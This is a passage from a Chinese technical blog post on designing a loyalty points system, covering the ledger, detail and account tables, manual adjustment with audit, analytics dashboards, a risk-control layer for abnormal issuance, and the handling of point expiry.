<p>每一条明细，都是一笔“可被消费的积分资产”。</p>
<ul>
<li>FIFO 消费</li>
<li>定时过期</li>
<li>部分使用、部分剩余</li>
</ul>
<p>这些能力全部依赖积分明细来完成。 如果只有流水而没有明细，积分系统在“使用”和“过期”阶段几乎无法扩展。</p>
<p><strong>积分账户（Account）：只负责给出当前结果</strong></p>
<p>积分账户是一张<strong>非常克制</strong>的表。 它不关心规则、不关心倍率，也不参与任何计算逻辑。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `point_account` (
  `user_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'用户ID'</span>,
  `balance` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'0'</span> COMMENT <span class="hljs-string">'当前积分余额'</span>,
  `version` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'0'</span> COMMENT <span class="hljs-string">'乐观锁版本号'</span>,
  `updated_at` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">'更新时间'</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`user_id`)
) ENGINE<span class="hljs-operator">=</span>InnoDB COMMENT<span class="hljs-operator">=</span><span class="hljs-string">'用户积分账户表（仅存当前余额）'</span>;
</code></pre>
<p>它只解决一个问题： <strong>用户现在还有多少积分。</strong></p>
<p>所有复杂逻辑都已经在流水和明细层完成，账户表只负责存最终结果，保证高并发下的查询性能。</p>
<h4 data-id="heading-25">三张表为什么必须同时存在</h4>
<p>这三张表看起来有些“重复”，但它们解决的是完全不同层面的事情：</p>
<ul>
<li>流水：保证过程可审计</li>
<li>明细：保证资产可管理</li>
<li>账户：保证查询够快</li>
</ul>
<p>在一次积分结算中，这三者必须在<strong>同一个事务内同时成功</strong>。 只有这样，积分系统才能做到：</p>
<ul>
<li>结果一致</li>
<li>过程可追溯</li>
<li>出问题能回查</li>
</ul>
<p>这也是后面风控审计、人工补偿、异常排查能够成立的基础。</p>
<h4 data-id="heading-26">原子性与一致性保证</h4>
<p>整个积分结算过程是放在一个事务中完成的：</p>
<ul>
<li>任意一步失败，整体回滚</li>
<li>账户余额更新使用乐观锁，防止并发冲突</li>
<li>流水表通过 <code>(rule_id, source_id)</code> 做幂等约束，防止重复发放</li>
</ul>
<p>这样一来，即使在高并发场景下，积分系统依然可以做到：</p>
<ul>
<li>不多发</li>
<li>不漏发</li>
<li>可追溯</li>
</ul>
<h4 data-id="heading-27">小结</h4>
<p>到这里，我们已经完整走完了一次积分事件从“上报”到“落账”的全过程。</p>
<p>在这一层设计中，我们刻意避免了三件事情：</p>
<ul>
<li>把规则写死在代码里</li>
<li>把所有限制混在一个判断里</li>
<li>只用一个表记录积分变化</li>
</ul>
<p>通过事件、规则、倍率、触发统计、发放限制、流水、明细、账户的分层设计，积分系统才能在复杂业务下依然保持清晰和可控。</p>
<hr/>
<h3 data-id="heading-28">查看用户积分：从规则执行到结果可追溯</h3>
<p>当积分规则、结算逻辑全部跑通之后，下一步真正要面对的问题其实是：</p>
<blockquote>
<p><strong>这些积分，最终落到用户身上，到底是什么样子？</strong></p>
</blockquote>
<p>因此，在 point-center 中，我们专门设计了一套<strong>以用户为中心的积分视图</strong>，用于承接所有规则执行后的结果。</p>
<h4 data-id="heading-29">用户积分列表：先看“结果”，而不是规则</h4>
<p>在后台的「用户积分」模块中，默认展示的是一个<strong>用户维度的积分列表</strong>。如图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a97c4ca2cce94dafa491e3bbe5868dc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=OW50doTnCaQ%2BZIJpIH238TV67H4%3D" alt="image-20251230220324294" loading="lazy"/></p>
<p>这个页面只关心几件事情：</p>
<ul>
<li>用户当前可用积分是多少</li>
<li>最近一次积分变动发生在什么时候</li>
<li>是否存在即将到期的积分</li>
<li>是否是 VIP、是否存在风险标签</li>
</ul>
<p>如上图所示，列表中不会直接暴露复杂的规则信息，而是以<strong>运营和客服最关心的结果状态</strong>为主：</p>
<ul>
<li>当前积分（汇总值）</li>
<li>7 天内即将到期的积分数量</li>
<li>最近一次积分变动时间</li>
<li>可直接进入「流水」「明细」「人工调整」</li>
</ul>
<p>这个设计的核心原则是：</p>
<blockquote>
<p><strong>规则是给系统用的，结果才是给人看的。</strong></p>
</blockquote>
<h4 data-id="heading-30">积分流水：回答“这一次积分是怎么来的”</h4>
<p>在用户列表中点击「查看流水」，进入的是<strong>积分流水视图（Ledger）</strong> 。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec072e3003ae47e6b7868c605328cec4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=alZqEvQr1bk2qwpxlQ7UYjPRCfA%3D" alt="image-20251230220413980" loading="lazy"/></p>
<p>这一层展示的是<strong>一次次积分变动的过程记录</strong>，比如：</p>
<ul>
<li>由哪条规则触发</li>
<li>对应的业务事件是什么</li>
<li>原始积分是多少</li>
<li>是否命中了倍率</li>
<li>最终实际生效了多少积分</li>
<li>余额是如何变化的</li>
</ul>
<p>从页面上可以清楚看到类似这样的信息：</p>
<ul>
<li>「订单支付完成固定积分」</li>
<li>原始积分 50</li>
<li>命中活动倍率 ×2</li>
<li>实际积分 +100</li>
<li>余额从 220 变为 320</li>
</ul>
<p>这正好对应我们在设计时对 <strong>point_ledger</strong> 的定位：</p>
<blockquote>
<p>它是一个<strong>审计级账本</strong>，用于解释“为什么这次积分会变成这样”。</p>
</blockquote>
<p>无论是客服排查、运营核对，还是风控回溯，<strong>流水永远是第一入口</strong>。</p>
<h4 data-id="heading-31">积分明细：回答“这些积分以后怎么用”</h4>
<p>与流水不同，「查看明细」进入的是<strong>积分明细视图（Detail）</strong> 。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00a19a2283c34d3a8eebd94e9e598725~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=mCpFpCsKvIYOmmlmEm48hIT%2FPv8%3D" alt="image-20251230220448040" loading="lazy"/></p>
<p>这里关注的已经不是“发生了什么”，而是：</p>
<ul>
<li>这批积分还剩多少</li>
<li>是否已经被使用</li>
<li>是否已经过期</li>
<li>如果有过期，是哪一次发放的积分过期了</li>
</ul>
<p>页面中可以清楚看到：</p>
<ul>
<li>每一条积分明细对应一次流水</li>
<li>明确的过期时间（或永久有效）</li>
<li>当前剩余可用积分</li>
<li>状态：可用 / 已用 / 已过期</li>
</ul>
<p>这正是 <strong>point_detail</strong> 表存在的意义：</p>
<blockquote>
<p>用于支撑 <strong>FIFO 消费、过期处理、精确扣减</strong>。</p>
</blockquote>
<p>也正因为有这层明细存在，系统才能做到：</p>
<ul>
<li>扣积分时优先扣即将过期的</li>
<li>定时任务只处理已到期的那一批积分</li>
<li>不会出现“余额对得上，但明细对不上”的问题</li>
</ul>
<h4 data-id="heading-32">为什么还需要「人工调整积分」</h4>
<p>再完整的规则系统，也无法覆盖所有现实场景。</p>
<p>在实际运营中，人工调整积分通常出现在这些情况下：</p>
<ul>
<li>用户投诉，需要补偿积分</li>
<li>活动异常，规则漏发，需要人工补发</li>
<li>风控介入，需要扣除异常获取的积分</li>
<li>历史问题修正，需要人工修账</li>
</ul>
<p>因此在用户列表中，我们提供了「人工调整」入口。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0b9e91c4c1f4af0aba1969db2410be3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=GFSpLES8fqSo1rL1z6MPUAA4tSo%3D" alt="image-20251230220537072" loading="lazy"/></p>
<p><strong>人工调整不是直接改余额</strong></p>
<p>从页面上可以看到，人工调整并不是一个“随便加减”的操作，而是一个<strong>受控流程</strong>：</p>
<ul>
<li>明确区分「增加积分 / 扣减积分」</li>
<li>必填调整原因，且有最少字数限制</li>
<li>明确提示：需要审批后生效</li>
<li>每一次人工操作都会进入流水与审计体系</li>
</ul>
<p>这类操作在系统内部同样会：</p>
<ul>
<li>写入 point_ledger（类型为 ADJUST）</li>
<li>生成对应的 point_detail（如果是增加）</li>
<li>更新 point_account 余额</li>
<li>进入人工操作审计模块，供风控回溯</li>
</ul>
<p>这样设计的目的只有一个：</p>
<blockquote>
<p><strong>人工兜底可以存在，但必须可追溯、可审计、可回放。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-33">从数据看积分系统的真实运行状态</h3>
<p>在规则和结算逻辑跑通之后，其实还有一个非常关键的问题需要被回答清楚： 这套积分系统现在到底在怎么运转？</p>
<p>单看规则配置本身，其实很难判断系统是不是健康的。真正有价值的视角，来自于积分在真实用户行为中的流转情况。所以在后台中，我们简单设计了一层积分分析视图，用来从整体数据层面观察积分系统的运行状态，如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1bb786131364be4bc389b4f0d0fe06e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=RL0WNk6LnsO89OlJuAyu4atnQDU%3D" alt="image-20251230234921629" loading="lazy"/></p>
<p>从这个页面里，我们可以直观看到积分主要来源于哪些行为，比如是消费返积分为主，还是签到、活动赠送占比较高；同时也能看到积分最终被用在了哪里，是商品兑换、抽奖，还是大量因为过期而被消耗掉。这些数据本身并不直接参与规则判断，但它们会非常明显地反映出当前积分体系的结构是否合理。</p>
<p>更重要的是，这个视图并不只是给技术或风控看的，它对运营同样非常关键。运营在配置规则时，不能只关心规则有没有生效，还需要结合这些数据去理解用户的积分画像：哪些用户在高频赚积分，哪些用户长期囤积分却不使用，哪些积分规则发放量很大，但实际转化效果并不好。</p>
<p>这些信息，都会直接影响后续规则的调整方向。比如是否需要引导积分消费、是否需要限制某些发放过快的规则、是否要针对不同用户行为设计差异化玩法。也正是基于这样一层数据观察，后面的风控判断和规则优化才不是拍脑袋，而是有迹可循的系统性决策。</p>
<hr/>
<h3 data-id="heading-34">积分风控层：为积分体系增加一道安全保障</h3>
<p>在积分规则和结算逻辑逐渐完善之后，我们很快会遇到一个现实问题：</p>
<blockquote>
<p><strong>我们设计的积分系统，真的安全吗？</strong></p>
</blockquote>
<p>从系统设计上看，规则没问题、逻辑也没问题，但在真实运行中，积分系统面对的是<strong>不受控的用户行为、不断变化的活动策略，以及不可避免的人工操作</strong>。</p>
<p>这也是我们最终决定引入「积分风控层」的原因。</p>
<h4 data-id="heading-35">为什么单靠规则系统不够？</h4>
<p>积分规则解决的是一件事：</p>
<blockquote>
<p><strong>在什么情况下，给多少积分。</strong></p>
</blockquote>
<p>但它并不擅长回答这些问题：</p>
<ul>
<li>这条规则最近发放的积分是不是异常地多？</li>
<li>某个用户的积分增长，是否明显偏离正常水平？</li>
<li>人工补偿、人工扣减，有没有被滥用？</li>
<li>多个规则、倍率叠加在一起，会不会放大风险？</li>
</ul>
<p>举几个真实容易出现的场景。</p>
<h4 data-id="heading-36">场景一：规则没错，但被“刷”了</h4>
<p>比如一条比例积分规则：</p>
<ul>
<li>每消费 10 元给 1 积分</li>
<li>本身逻辑完全合理</li>
</ul>
<p>但如果某个用户在极短时间内高频触发，或者被脚本反复调用接口，<strong>规则并不会觉得这是异常的</strong>，它只会老老实实算分、发分。</p>
<p>等发现问题时，积分已经发出去了。</p>
<h4 data-id="heading-37">场景二：倍率和活动叠加，放大了风险</h4>
<p>再比如：</p>
<ul>
<li>一条长期有效的比例积分规则</li>
<li>恰好命中了一个双倍积分活动</li>
</ul>
<p>从配置角度看，每一项都是“合法的”， 但叠加在一起，就可能导致：</p>
<ul>
<li>短时间内积分发放规模异常放大</li>
<li>单条规则成为积分系统的主要风险来源</li>
</ul>
<p>规则系统本身，很难主动意识到这种“组合风险”。</p>
<h4 data-id="heading-38">场景三：人工调整，本身就是高风险操作</h4>
<p>人工调整是积分系统里<strong>必须存在</strong>的一环，但它天然带有风险：</p>
<ul>
<li>人为操作，无法完全避免误操作</li>
<li>补偿、扣减一旦量级较大，影响直接反映在用户资产上</li>
<li>如果缺乏监控和审计，很容易成为系统隐患</li>
</ul>
<p>所以只要存在人工操作，就一定要有对应的风控视角。</p>
<h4 data-id="heading-39">场景四：数值异常，往往是问题的第一信号</h4>
<p>在实际运营中，很多问题不是“明确的错误”，而是<strong>数值开始变得不正常</strong>：</p>
<ul>
<li>某条规则的发放量突然飙升</li>
<li>某个用户积分短时间内暴涨</li>
<li>某类规则的发放趋势明显偏离历史水平</li>
</ul>
<p>这些情况，如果只依赖人工事后排查，成本会非常高。</p>
<h4 data-id="heading-40">所以，积分风控解决的是什么？</h4>
<p>在我们的设计里，积分风控层并不是用来“代替规则”的，而是承担一个更偏<strong>守门人</strong>的角色：</p>
<ul>
<li>对积分发放行为做整体观察</li>
<li>对异常趋势进行提前暴露</li>
<li>对高风险规则和用户进行标记</li>
<li>为人工干预和审计提供依据</li>
</ul>
<p>换句话说：</p>
<blockquote>
<p><strong>规则负责把积分发出去， 风控负责盯着发得对不对、稳不稳。</strong></p>
</blockquote>
<p>这也是后面我们会看到的一系列风控页面存在的前提。</p>
<hr/>
<h3 data-id="heading-41">积分风控层：为积分体系加上一层安全保障</h3>
<p>在真正把积分系统跑到线上之前，其实有一个问题是绕不开的： <strong>积分一旦发出去，基本就是“真钱”。</strong></p>
<p>不管是能抵扣现金、兑换商品，还是影响用户等级，只要积分具备价值，它就一定会被盯上。</p>
<p>我自己在做积分系统时，遇到过几类非常典型的问题： 比如某个规则配置不当，被用户短时间刷出大量积分； 比如活动倍率叠加时没控制好，积分发放突然暴涨； 再比如人工补偿操作没有审计，最后根本说不清是谁、因为什么给了用户这笔积分； 还有一种更常见的，是数据本身没有问题，但数值“看起来就很不对劲”，运营或风控却没法第一时间发现。</p>
<p>这些问题如果等到用户已经把积分用掉，再回头查，成本会非常高。 所以在设计积分系统时，我一开始就把它当成一个<strong>需要风控兜底的资产系统</strong>来看，而不是一个简单的“加减数值”。</p>
<p>基于这个前提，我在积分服务中心里单独拆出了一层 <strong>积分风控模块</strong>，专门用来做三件事： <strong>看趋势、找异常、兜人工操作。</strong></p>
<h4 data-id="heading-42">后台整体结构说明</h4>
<p>在后台结构上，积分相关的页面我并没有全部堆在“用户积分”下面，而是单独划分出了一个 <strong>积分风控管控区</strong>，配合一个整体的积分大盘，用来从不同视角观察系统状态。</p>
<p>下面我结合页面简单讲一下每一块在系统里承担的角色。</p>
<h4 data-id="heading-43">积分大盘：先看整体是不是“健康的”</h4>
<p>如图所示，积分大盘并不是用来做精细操作的，它的定位非常明确，就是一句话： <strong>今天积分系统是不是在正常工作。</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a12d66dc4e84963bbf5d21ea20b522b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=CQCHdm2nGX76tLhBrPAxLh%2BWT%2FU%3D" alt="image-20251230222242548" loading="lazy"/></p>
<p>在这个页面里，我重点放了几类指标： 当天积分发放总量、触达用户数、发放成功率，以及是否存在异常事件。 同时还会列出当天积分发放最多的规则，以及当前正在生效的倍率和活动。</p>
<p>这些信息的价值不在于“查某一个用户”，而在于<strong>快速感知系统状态</strong>。 只要我们发现发放量、命中规则或者倍率活动和我们的预期不一致，就应该立刻往下钻，而不是等用户来反馈。</p>
<h4 data-id="heading-44">积分风控管控模块</h4>
<p>如果说积分大盘是“全局视角”，那风控模块更多就是<strong>问题定位区</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7fa00c2624fb46a888fe633b3bcb74fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=cOImXoXRozg6KmHCe84iIb1U6ZQ%3D" alt="image-20251230222351012" loading="lazy"/></p>
<p><strong>风险概览：把异常集中到一个视图里</strong></p>
<p>风险概览页面的核心作用，是把分散在各处的异常信号集中展示出来。 比如当天积分发放总量、异常用户数、触发限流的规则数量，以及人工积分操作的次数。</p>
<p>再往下，会看到近 7 天的风险趋势，把积分发放量、异常用户、人工操作放在同一个时间轴里，其实一眼就能看出是否存在“异常共振”的情况。</p>
<p>这个页面的设计目标很简单： <strong>不要求我们立刻知道问题原因，但要让我们知道“这里不太对劲”。</strong></p>
<h4 data-id="heading-45">异常积分记录：把可疑的用户直接拎出来</h4>
<p>当系统识别到积分异常时，并不会悄悄处理，而是会生成一条异常积分记录，统一进入这个列表。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac69500f9a854cc9a2ae800b52c4f637~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=miB5bqNCGZ1rQqOpWS8SqQ%2BzWUw%3D" alt="image-20251230222438246" loading="lazy"/></p>
<p>在这个页面里，我们可以直接看到： 是哪一个用户、命中了哪条规则、异常指标是多少、异常类型是什么，以及当前处理状态。</p>
<p>这一步非常关键的一点是： 异常并不等于错误，它只是告诉我们这个行为值得被关注。</p>
<p>有些异常可能是正常活动导致的，有些则可能是规则配置问题，或者刷行为的前兆。 是否需要处理，交给风控或运营来判断，但<strong>系统必须把问题暴露出来</strong>。</p>
<h4 data-id="heading-46">高风险规则：从规则而不是用户反推问题</h4>
<p>很多时候，问题并不在某个用户身上，而是在规则本身。</p>
<p>所以我单独做了一个 <strong>高风险规则视图</strong>，从规则维度出发，把近 7 天发放积分异常集中的规则拉出来，并结合风险因子进行标记，比如： 是否是比例积分、是否命中倍率活动、是否存在无限发放、是否高频触发等。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e6ea72f160d4f5497e5385cfc213dcf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=moxSzOA85PCHnbOwv2pz95FYmEQ%3D" alt="image-20251230222552573" loading="lazy"/></p>
<p>这个页面的意义在于： <strong>帮我们判断，是不是规则设计本身就有风险，而不是等用户一个个冒出来再处理。</strong></p>
<h4 data-id="heading-47">人工操作审计：给人工操作上的最后一道约束</h4>
<p>最后一块，是人工操作审计。</p>
<p>在积分系统里，人工补给或扣除几乎是不可避免的： 用户投诉、活动补偿、数据修正，都会涉及人工调整。</p>
<p>但只要是人工操作，就一定要有审计。</p>
<p>在这个页面中，所有非自动产生的积分变动都会被完整记录，包括： 操作人、操作对象、积分变动值、是否被判定为风险操作，以及对应的时间点。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a09409933a240ceb2a46d3da86c967c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=sGSVMgmhaFhX6urXMRQQ%2B79T3Js%3D" alt="image-20251230222634690" loading="lazy"/></p>
<p>同时我还会单独统计当天人工操作次数、风险操作次数和影响用户数，避免人工操作在系统中“悄悄发生”。</p>
<p>这一步并不是为了限制运营，而是为了<strong>在出问题时能清楚地还原发生了什么</strong>。</p>
<h4 data-id="heading-48">小结一下</h4>
<p>积分系统一旦具备价值，就一定要被当成资产系统来设计。 而资产系统，永远不能只关心“怎么算”，还必须关心“会不会出事、出了事怎么看”。</p>
<p>所以在这个积分体系里，风控层并不是一个附加功能，而是从一开始就被当成核心模块来设计的。 它不直接参与积分计算，但决定了这个系统<strong>能不能长期、安全地跑下去</strong>。</p>
<hr/>
<h3 data-id="heading-49">风控规则的设计原则：高风险规则并不是一张表</h3>
<p>在积分系统中，我们并没有把「高风险规则」当成一个独立维护的业务实体来看。 相反，它更像是一个<strong>基于现有数据和策略，在运行时计算出来的判断结果</strong>。</p>
<p>换句话说，高风险规则并不对应数据库里的某一张表，而是一个<strong>派生视图</strong>。</p>
<p>这一点，可能和很多人一开始的直觉其实是相反的。</p>
<h4 data-id="heading-50">为什么没有单独设计一张「高风险规则表」</h4>
<p>在设计积分风控模块时，很多人的第一反应通常是：</p>
<blockquote>
<p>要不要建一张 <code>high_risk_rule</code> 表？ 把规则、风险等级、风险原因都存下来？</p>
</blockquote>
<p>但在真正落地设计之后，我们反而<strong>刻意没有这样做</strong>。</p>
<p>原因很简单—— <strong>高风险规则本身，并不是一个稳定的业务数据实体。</strong></p>
<h4 data-id="heading-51">高风险规则不是事实数据</h4>
<p>在积分系统里，我们通常会把数据分成两类。</p>
<p>一类是<strong>事实数据</strong>，比如：</p>
<ul>
<li>积分规则配置（<code>point_rule</code>）</li>
<li>积分流水（<code>point_ledger</code>）</li>
<li>积分明细（<code>point_detail</code>）</li>
</ul>
<p>这些数据一旦产生，就具备明确的业务含义，可以长期存储、反复使用，也具备审计价值。</p>
<p>而「高风险规则」并不属于这一类。</p>
<p>它本质上是一个结论，回答的是这样的问题：</p>
<blockquote>
<p>在<strong>某一个时间点</strong>， 基于当前规则配置、近期积分行为以及风控策略， 这条规则<strong>现在</strong>风险高不高？</p>
</blockquote>
<p>也就是说，它描述的是一种<strong>判断结果</strong>，而不是一个业务事实。</p>
<h4 data-id="heading-52">风险是“算出来的”，不是“存出来的”</h4>
<p>以高风险规则页面为例，它展示的数据并不是凭空出现的，而是来源于三类已有数据：</p>
<p><strong>第一类：规则配置数据</strong> 来自 <code>point_rule</code> 表，用于判断规则的基础属性，比如是不是比例积分、有没有发放上限、是否长期有效等。</p>
<p><strong>第二类：倍率与活动数据</strong> 来自 <code>point_multiplier_config</code> 表，用于判断规则是否存在倍率叠加、活动放大的风险。</p>
<p><strong>第三类：积分发放行为数据</strong> 来自 <code>point_ledger</code> / <code>point_detail</code> 表，用于统计规则在一定时间窗口内（比如近 7 天）的实际发放规模和波动情况。</p>
<p>在这些数据的基础上，我们再通过一层<strong>风控评估逻辑</strong>进行综合判断，把原始数据转化为：</p>
<ul>
<li>风险等级</li>
<li>风险因子说明</li>
<li>关键统计指标</li>
</ul>
<p>最终生成高风险规则页面所需的数据结构。</p>
<h4 data-id="heading-53">高风险规则页面的数据从哪里来</h4>
<p>从系统结构上看，高风险规则页面并不是直接读取某一张表，而是一个典型的“派生视图”：</p>
<pre><code class="hljs">规则配置（point_rule）
        +
倍率活动（point_multiplier_config）
        +
积分发放行为（point_ledger / point_detail）
        +
风控评估逻辑（RiskEvaluator）
        ↓
高风险规则视图（HighRiskRuleDTO）
</code></pre>
<p>对应到接口层，比如我们会提供这样一个接口：</p>
<pre><code class="hljs language-ini" lang="ini">GET /risk/high-rules?<span class="hljs-attr">days</span>=<span class="hljs-number">7</span>
</code></pre>
<p>返回的其实是一组已经完成风控评估的 DTO，而不是数据库记录，例如：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">[</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"ruleId"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"ruleCode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ORDER_PAY_RATIO"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"ruleDesc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"订单支付按金额比例积分"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"riskLevel"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"HIGH"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"riskFactors"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"比例积分规则"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"命中双倍积分活动"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"近7日发放积分超过阈值"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"metrics"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"points7d"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">420000</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"hitMultiplier"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<p>高风险规则页面本质上展示的是一组经过风控评估后的 <strong>DTO（Data Transfer Object）</strong> ，而非直接映射数据库表结构。</p>
<h4 data-id="heading-54">为什么不一开始就把风险结果落表呢</h4>
<p>如果我们一开始就把高风险规则直接存成表，会立刻遇到一系列现实问题：</p>
<ul>
<li>同一条规则，今天是高风险，明天还是吗？</li>
<li>风控策略调整后，历史风险数据要不要重算？</li>
<li>风险等级变化，是更新原记录，还是新增一条？</li>
<li>不同时间窗口下的风险结论，怎么共存？</li>
</ul>
<p>这些问题本质上都指向同一个结论：</p>
<p><strong>风险评估结果是动态的，而数据库表更适合存放稳定事实。</strong></p>
<p>在当前阶段，把高风险规则设计为<strong>实时评估 + 即时展示</strong>，反而边界更清晰，也更利于风控策略的演进。</p>
<h4 data-id="heading-55">那我们什么时候才值得落表呢</h4>
<p>只有在一种情况下，高风险规则才有必要被存下来：</p>
<p>当风险评估结果需要被<strong>确认、处理或审计</strong>的时候。</p>
<p>比如：</p>
<ul>
<li>风控人员确认某条规则确实存在问题</li>
<li>需要给出人工判断结论或备注</li>
<li>需要对风险处理过程进行留痕和回溯</li>
</ul>
<p>但即便如此，真正落表的也不是“高风险规则本身”，而是：</p>
<p><strong>某一次风险评估的结果快照（Snapshot）</strong> ， 而不是当前实时的风险状态。</p>
<h4 data-id="heading-56">设计上的一句总结</h4>
<p>所以，在积分系统的风控设计中，我们更倾向于这样理解：</p>
<p><strong>高风险规则不是一张表，而是一次风险评估的结果。</strong></p>
<p>它来自已有数据的组合判断， 会随着时间、行为和策略变化而变化， 也正因如此，它更适合作为一个派生视图存在，而不是被固化为业务主数据。</p>
<hr/>
<h3 data-id="heading-57">积分过期处理：扫描结算 + 消费时校验的双重保障</h3>
<p>在积分过期的设计上，我们并没有把是否过期这件事完全交给定时任务，而是拆成了<strong>两条相互配合的处理链路</strong>： 一条负责<strong>账务结算</strong>，一条负责<strong>使用时兜底校验</strong>。</p>
<h4 data-id="heading-58">一、过期扫描：只负责“把账算清楚”</h4>
<p>首先，系统会通过定时任务对积分明细表进行过期扫描，但这个扫描并不是全表遍历，也不是单纯依赖 <code>expired_at</code> 字段，而是只关注<strong>仍然具备业务意义的积分资产</strong>。</p>
<p>扫描条件通常类似于：</p>
<ul>
<li>当前状态仍然是有效状态（如 <code>status = 'ACTIVE'</code>）</li>
<li>仍有剩余可用积分（<code>remain_amount &gt; 0</code>）</li>
<li>已经超过过期时间（<code>expired_at &lt;= NOW()</code>）</li>
</ul>
<p>通过这种组合条件，定时任务的扫描范围被严格限定在“<strong>确实可能发生过期的积分明细</strong>”之内，既避免了无效扫描，也不会反复处理已经结算过的记录。</p>
<p>一旦发现某条积分明细满足过期条件，系统并不会只做字段更新，而是会按一次完整的账务流程来处理这次过期：</p>
<ul>
<li>写入一条 <code>EXPIRE</code> 类型的积分流水，用于审计和追溯；</li>
<li>将对应积分明细的剩余积分清零，并更新状态为已过期；</li>
<li>同步扣减用户积分账户中的可用余额。</li>
</ul>
<p>整个过程通常放在同一个事务中完成，确保<strong>流水、明细、账户余额三者始终一致</strong>。 也正因为有了这一步，系统中的“历史账务状态”才能长期保持干净、可追溯。</p>
<h4 data-id="heading-59">二、消费时校验：确保不会“用到脏积分”</h4>
<p>但仅靠定时扫描，其实还不够。</p>
